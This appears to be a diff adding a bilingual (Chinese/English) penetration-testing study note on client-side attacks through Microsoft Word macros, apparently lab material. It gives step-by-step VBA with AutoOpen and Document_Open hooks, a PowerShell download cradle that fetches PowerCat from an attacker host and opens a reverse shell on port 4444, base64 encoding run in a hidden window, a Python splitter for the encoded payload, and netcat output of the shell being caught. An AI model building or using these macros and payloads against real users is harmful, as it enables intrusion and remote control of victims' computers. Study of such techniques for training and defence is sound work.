@@ -1866,3 +1866,131 @@ Changed message after opening the document\
 >> `Visual Basic for Applications (VBA)`: VBA 是一種由微軟開發的程式語言，主要用於自動化和擴展 Microsoft Office （如 Word、Excel、PowerPoint）的功能。 \
 >> `ActiveX objects`: 微軟推出的技術，允許在應用程式中嵌入程式碼。創建可嵌入的控件（如按鈕、圖形、文件瀏覽器等)\
 >> `Windows Script Host`: 微軟提供的 Windows 的腳本環境，允許執行用於自動化操作的腳本。如 JavaScript、VBScript 等。
+
+#### macro in Microsoft Word to launch a reverse shell
+`Macros` are one of the oldest and best-known client-side attack vectors.
+(1) 建立一個空白 Word 檔\
+(2) 儲存為 `.doc` (`.docx`可以執行 macro，但不能嵌入儲存)\
+(3) 創建 macro ( Word > View > Macros)\
+(4) Macro Name ＆ Macros in: mymacro(document)\
+    ![image](https://hackmd.io/_uploads/SyrHqSKVJl.png)\
+(5) 顯示 Microsoft Visual Basic 的 Applications window，可以開始編輯 macro\
+![image](https://hackmd.io/_uploads/r1B39rY4ye.png)\
+(6) 透過 Windows Script Host Shell 撰寫 WScript 執行\
+範例： 開啟 PowerShell 視窗
+```WScript
+Sub MyMacro()
+
+  CreateObject("Wscript.Shell").Run "powershell"
+  
+End Sub
+```
+>[!Caution]
+> Office 巨集不會自動執行，所以需要定義 AutoOpen macro 和 Document_Open event
+            
+(7) Renew VBA code
+```WScript
+Sub AutoOpen()
+
+  MyMacro
+  
+End Sub
+
+Sub Document_Open()
+
+  MyMacro
+  
+End Sub
+
+Sub MyMacro()
+
+  CreateObject("Wscript.Shell").Run "powershell"
+  
+End Sub
+```
+(8) 儲存後重開檔案。 security warning 選擇 Enable Content。\
+(9) 成功跳出 PowerShell 視窗
+
+#### execution of current macro to a reverse shell: PowerCat
+(1) 透過 [cradle](https://gist.github.com/HarmJ0y/bb48307ffa663256e239) 下載 PowerCat\
+(2) 寫入 reverse shell
+```powershell
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
+```
+(3) base64-encoded PowerShell commands (declared as a String in VBA.)
+>[!Warning]
+> VBA 的字串長度限制 255-character，所以不能單純將 base64-encoded PowerShell commands 存入單一字串。\
+>可以透過 multiple lines 再串接起來
+
+以下分割字串用 python 完成:
+```python=
+#str 為分割前的指令
+str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
+
+n = 50
+
+#for 迴圈輸出符合巨集的格式
+for i in range(0, len(str), n):
+	print("Str = Str + " + '"' + str[i:i+n] + '"')
+```
+
+(4) 回到 Macro 編輯視窗，透過 `Dim` 宣告 `Str`變數，並且將 PowerShell download 儲存在 `Str`中
+```WScript
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+```
+
+(5) 加入經過 python 分割的字串
+```WScript
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
+        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
+        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
+    ...
+        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
+        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
+        Str = Str + "A== "
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+```
+> 編輯完後，儲存重開檔案
+
+>[!Tip]
+> 重啟 Word 時，不再顯示 security warning\
+> (除非更改檔名才需要再次確認 Enable Content )
+
+(6) 在 PowerCat 目錄下啟動 Python3 Web Server, 同時開啟 Netcat listening port
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.119.2] from (UNKNOWN) [192.168.50.196] 49768
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\offsec\Documents>
+```
+
